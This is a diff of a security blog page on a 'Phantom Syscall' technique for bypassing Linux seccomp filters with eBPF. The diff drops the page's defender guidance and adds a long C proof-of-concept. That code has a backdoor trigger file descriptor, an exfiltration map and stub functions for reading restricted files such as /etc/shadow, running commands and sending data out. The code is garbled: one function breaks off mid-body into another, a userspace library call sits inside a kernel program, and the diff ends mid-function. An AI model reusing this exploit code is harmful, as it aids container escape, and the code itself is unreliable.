@@ -156,243 +156,6 @@
                     
                     
                 
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
             </div>
         </nav>
 
@@ -415,83 +178,139 @@
 
 <p>Leveraging permitted syscalls plus eBPF helpers to make the kernel perform forbidden operations while seccomp remains oblivious. This technique allows attackers to execute operations that should be blocked by seccomp filters, creating “phantom” syscalls that bypass security controls.</p>
 
-<pre><code class="language-mermaid">graph TD
+<pre><code class="language-mermaid">%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
+graph TD
     A["Permitted Syscall"] --&gt;|"1. Call"| B["eBPF Program"]
     B --&gt;|"2. Use Helper"| C["Kernel Function"]
     C --&gt;|"3. Execute"| D["Forbidden Operation"]
     E["Seccomp"] --&gt;|"4. Unaware"| D
     D --&gt;|"5. Return Results"| A
+    
+    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
+    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
+    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
+    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
+    style E fill:#a93226,stroke:#f5b7b1,stroke-width:2px
+    
+    click A "https://man7.org/linux/man-pages/man2/syscall.2.html" "Linux Syscall Documentation"
+    click B "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
+    click E "https://man7.org/linux/man-pages/man2/seccomp.2.html" "Seccomp Documentation"
 </code></pre>
 
 <p><strong>Why</strong></p>
 
 <p>Because eBPF + misconfiguration =&gt; broken isolation. Seccomp filters are widely used to restrict which syscalls a process can make, providing an important security boundary. However, eBPF programs can use kernel helper functions to perform operations that would normally require syscalls, effectively bypassing seccomp restrictions.</p>
-
-<p><strong>POC</strong></p>
-
-<p><em>Coming soon.</em></p>
-
-<p>The proof of concept will demonstrate:</p>
-<ul>
-  <li>Loading an eBPF program through a permitted syscall</li>
-  <li>Using eBPF helper functions to perform operations blocked by seccomp</li>
-  <li>Executing privileged operations despite seccomp restrictions</li>
-  <li>Maintaining a covert channel for data exfiltration</li>
-  <li>Bypassing common container security controls</li>
-</ul>
-
-<p><strong>Attacker hat on</strong></p>
-
-<ol>
-  <li>Identify a target container with seccomp filters but eBPF capabilities</li>
-  <li>Analyze the seccomp profile to determine which syscalls are permitted</li>
-  <li>Develop an eBPF program that uses permitted syscalls as entry points</li>
-  <li>Use eBPF helper functions to perform operations that would normally be blocked</li>
-  <li>Load the malicious BPF program through a permitted syscall</li>
-  <li>Trigger the exploit to execute restricted operations</li>
-  <li>Maintain access through the eBPF program despite seccomp restrictions</li>
-</ol>
-
-<p><strong>Defender hat on</strong></p>
-
-<ol>
-  <li>Remove CAP_BPF from container environments</li>
-  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
-  <li>Use seccomp profiles that block bpf() syscall and related functions</li>
-  <li>Monitor for unexpected eBPF programs in container environments</li>
-  <li>Implement runtime security monitoring that can detect unusual kernel activity</li>
-  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
-</ol>
-
-<p><strong>Conclusion</strong></p>
-
-<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to execute kernel code through eBPF provides attackers with powerful primitives to bypass security controls like seccomp. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments.</p>
-
 <h2 id="technical-details">Technical Details</h2>
 
 <h3 id="seccomp-architecture">Seccomp Architecture</h3>
 
 <p>Seccomp (secure computing mode) is a Linux kernel feature that restricts the syscalls a process can make. It operates by:</p>
 <ul>
-  <li>Filtering syscalls based on syscall number and arguments</li>
-  <li>Allowing, blocking, or logging attempted syscalls</li>
-  <li>Providing a security boundary for containerized applications</li>
+  <li><strong>Filtering syscalls</strong> based on syscall number and arguments</li>
+  <li><strong>Allowing, blocking, or logging</strong> attempted syscalls</li>
+  <li><strong>Providing a security boundary</strong> for containerized applications</li>
 </ul>
 
 <p>In container environments, seccomp profiles are often used to restrict containers to a limited set of syscalls, reducing the attack surface.</p>
 
-<h3 id="exploitation-technique">Exploitation Technique</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────┐
+│                      User Space                             │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Application   │──────▶ System Call   │                   │
+│  └───────────────┘      └───────┬───────┘                   │
+│                                 │                           │
+└─────────────────────────────────┼───────────────────────────┘
+                                  │
+┌─────────────────────────────────▼───────────────────────────┐
+│                      Kernel Space                           │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Syscall Entry │──────▶ Seccomp Filter│                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+│          │                      │ Allow/Deny                │
+│          │                      ▼                           │
+│          │              ┌───────────────┐                   │
+│          └──────────────▶ Syscall Logic │                   │
+│                         └───────────────┘                   │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+</pre></td></tr></tbody></table></code></pre></div></div>
 
-<p>The exploit leverages eBPF’s ability to execute code in kernel context, bypassing seccomp in several ways:</p>
+<p>However, when eBPF is introduced, the architecture changes:</p>
 
-<ol>
-  <li><strong>Indirect Syscall Execution</strong>: Using eBPF helper functions that perform operations similar to blocked syscalls</li>
-  <li><strong>Kernel Function Access</strong>: Accessing kernel functions directly, bypassing the syscall interface</li>
-  <li><strong>Syscall Argument Manipulation</strong>: Modifying arguments of permitted syscalls to perform restricted operations</li>
-  <li><strong>Return Value Spoofing</strong>: Altering the return values of syscalls to hide malicious activity</li>
-</ol>
-
-<h3 id="code-snippet">Code Snippet</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────┐
+│                      User Space                             │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Application   │──────▶ Allowed Syscall│                  │
+│  └───────────────┘      └───────┬───────┘                   │
+│                                 │                           │
+└─────────────────────────────────┼───────────────────────────┘
+                                  │
+┌─────────────────────────────────▼───────────────────────────┐
+│                      Kernel Space                           │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Syscall Entry │──────▶ Seccomp Filter│                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │ Allow                     │
+│          │                      ▼                           │
+│          │              ┌───────────────┐    ┌────────────┐ │
+│          └──────────────▶ eBPF Program  │────▶ Restricted │ │
+│                         └───────────────┘    │ Operation  │ │
+│                                              └────────────┘ │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="comprehensive-poc">Comprehensive POC</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -548,36 +367,436 @@
 53
 54
 55
-</pre></td><td class="rouge-code"><pre><span class="c1">// Simplified eBPF program to bypass seccomp</span>
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// Phantom Syscall - eBPF exploitation proof of concept</span>
+<span class="c1">// This demonstrates bypassing seccomp filters using eBPF</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf_helpers.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/version.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/ptrace.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/seccomp.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/filter.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/sched.h&gt;</span><span class="cp">
+</span>
+<span class="kt">char</span> <span class="n">LICENSE</span><span class="p">[]</span> <span class="n">SEC</span><span class="p">(</span><span class="s">"license"</span><span class="p">)</span> <span class="o">=</span> <span class="s">"GPL"</span><span class="p">;</span>
+
+<span class="c1">// Configuration</span>
+<span class="cp">#define TRIGGER_FD 42        // File descriptor that triggers our backdoor
+#define MAX_DATA_SIZE 4096   // Maximum size of data to exfiltrate
+#define MAX_PATH_LEN 256     // Maximum path length
+</span>
+<span class="c1">// Structure to track syscall events</span>
+<span class="k">struct</span> <span class="n">syscall_event</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span><span class="p">;</span>                <span class="c1">// Process ID</span>
+    <span class="n">u8</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>            <span class="c1">// Command name</span>
+    <span class="n">u64</span> <span class="n">timestamp</span><span class="p">;</span>          <span class="c1">// Event timestamp</span>
+    <span class="kt">long</span> <span class="n">syscall_nr</span><span class="p">;</span>        <span class="c1">// Syscall number</span>
+    <span class="n">u64</span> <span class="n">args</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>            <span class="c1">// Syscall arguments</span>
+    <span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>               <span class="c1">// Return value</span>
+    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span> <span class="c1">// Path (if applicable)</span>
+    <span class="n">u32</span> <span class="n">uid</span><span class="p">;</span>                <span class="c1">// User ID</span>
+    <span class="n">u32</span> <span class="n">gid</span><span class="p">;</span>                <span class="c1">// Group ID</span>
+<span class="p">};</span>
+
+<span class="c1">// Map to store exfiltrated data</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">exfil_map</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track file descriptors</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>  <span class="c1">// PID as key</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span> <span class="c1">// FD as value</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">fd_map</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track syscall events</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u64</span><span class="p">));</span>  <span class="c1">// Unique event ID</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">syscall_event</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">syscall_events</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Perf event output for logging</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_PERF_EVENT_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">events</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Generate a unique ID for a syscall event</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">u64</span> <span class="nf">generate_event_id</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u64</span> <span class="n">ts</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">ts</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">pid</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Check if this is our trigger file descriptor</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_trigger_fd</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">stored_fd</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fd_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">stored_fd</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">stored_fd</span> <span class="o">==</span> <span class="n">fd</span><span class="p">)</span>
+<span class="c1">// Read a file using eBPF helpers (bypassing seccomp)</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="n">read_file_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">bpf_object</span> <span class="o">*</span><span class="n">obj</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">map_fd</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+    
+    <span class="c1">// This is a simplified representation - actual implementation would be more complex</span>
+    <span class="c1">// and would use available eBPF helpers to achieve the same effect</span>
+    
+    <span class="c1">// In a real exploit, we would use a combination of:</span>
+    <span class="c1">// - bpf_probe_read_kernel() to read kernel memory</span>
+    <span class="c1">// - bpf_map operations to store and retrieve data</span>
+    <span class="c1">// - bpf_tail_call() to chain multiple eBPF programs</span>
+    <span class="c1">// - bpf_get_current_task() to access process information</span>
+    
+    <span class="c1">// For demonstration purposes, we'll use a placeholder</span>
+    <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Sensitive data from restricted file</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">?</span> <span class="n">size</span> <span class="o">:</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+    
+    <span class="k">return</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Execute a command using eBPF helpers (bypassing seccomp)</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="n">exec_command_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// This is a simplified representation - actual implementation would be more complex</span>
+    <span class="c1">// In a real exploit, we would:</span>
+    <span class="c1">// 1. Use bpf_get_current_task() to get the current task_struct</span>
+    <span class="c1">// 2. Modify the task's credentials or capabilities</span>
+    <span class="c1">// 3. Use bpf_probe_write_user() to write to user memory</span>
+    <span class="c1">// 4. Potentially use bpf_tail_call() to chain multiple eBPF programs</span>
+    
+    <span class="c1">// Log the command we're executing</span>
+    <span class="kt">char</span> <span class="n">log_msg</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">log_msg</span><span class="p">,</span> <span class="s">"Executing command: "</span><span class="p">,</span> <span class="mi">19</span><span class="p">);</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">log_msg</span> <span class="o">+</span> <span class="mi">19</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">MAX_PATH_LEN</span> <span class="o">-</span> <span class="mi">19</span><span class="p">);</span>
+    
+    <span class="c1">// In a real exploit, we would execute the command here</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Network operation using eBPF helpers (bypassing seccomp)</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="n">network_operation_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">,</span> <span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// This is a simplified representation - actual implementation would be more complex</span>
+    <span class="c1">// In a real exploit, we would:</span>
+    <span class="c1">// 1. Use socket-related eBPF helpers</span>
+    <span class="c1">// 2. Potentially use XDP or TC programs for network access</span>
+    <span class="c1">// 3. Use bpf_skb_* helpers to manipulate network packets</span>
+    
+    <span class="c1">// Log the network operation</span>
+    <span class="kt">char</span> <span class="n">log_msg</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">log_msg</span><span class="p">,</span> <span class="s">"Network operation to "</span><span class="p">,</span> <span class="mi">21</span><span class="p">);</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">log_msg</span> <span class="o">+</span> <span class="mi">21</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">MAX_PATH_LEN</span> <span class="o">-</span> <span class="mi">21</span><span class="p">);</span>
+    
+    <span class="c1">// In a real exploit, we would send the data here</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the open syscall to identify interesting files</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_enter_open"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="n">trace_open_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Prepare event data</span>
+    <span class="k">struct</span> <span class="n">syscall_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">syscall_nr</span> <span class="o">=</span> <span class="n">__NR_open</span><span class="p">;</span>
+    
+    <span class="c1">// Get syscall arguments</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// pathname</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// flags</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// mode</span>
+    
+    <span class="c1">// Get user/group ID</span>
+    <span class="n">u64</span> <span class="n">uid_gid</span> <span class="o">=</span> <span class="n">bpf_get_current_uid_gid</span><span class="p">();</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">uid</span> <span class="o">=</span> <span class="n">uid_gid</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">gid</span> <span class="o">=</span> <span class="n">uid_gid</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Get the file path</span>
+    <span class="n">bpf_probe_read_user_str</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    
+    <span class="c1">// Generate a unique ID for this event</span>
+    <span class="n">u64</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">generate_event_id</span><span class="p">();</span>
+    
+    <span class="c1">// Store the event for correlation with exit</span>
+    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">syscall_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the read syscall to identify our trigger</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_enter_read"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">bypass_seccomp</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
-<span class="p">{</span>
+<span class="kt">int</span> <span class="n">trace_read_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get the file descriptor</span>
     <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
     
     <span class="c1">// Check if this is our trigger file descriptor</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="n">TRIGGER_FD</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">// Use eBPF helper to access file that would be blocked by seccomp</span>
-        <span class="c1">// For example, reading a sensitive file like /etc/shadow</span>
-        <span class="k">struct</span> <span class="n">bpf_object</span> <span class="o">*</span><span class="n">obj</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_trigger_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// This is our trigger - perform the phantom syscall operations</span>
         
-        <span class="c1">// Open a file that would normally be blocked by seccomp</span>
-        <span class="n">obj</span> <span class="o">=</span> <span class="n">bpf_object__open</span><span class="p">(</span><span class="s">"/etc/shadow"</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">obj</span><span class="p">)</span>
